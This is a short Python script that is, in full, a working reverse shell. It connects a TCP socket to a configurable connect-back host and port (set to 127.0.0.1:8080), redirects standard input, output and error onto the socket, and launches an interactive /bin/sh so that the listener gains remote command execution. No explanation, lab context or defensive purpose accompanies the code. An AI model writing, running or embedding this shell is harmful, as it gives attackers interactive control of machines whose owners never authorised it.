#!/usr/bin/env python3
import socket, subprocess, os

CONNECT_BACK_HOST = "127.0.0.1"
CONNECT_BACK_PORT = 8080

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((CONNECT_BACK_HOST, CONNECT_BACK_PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
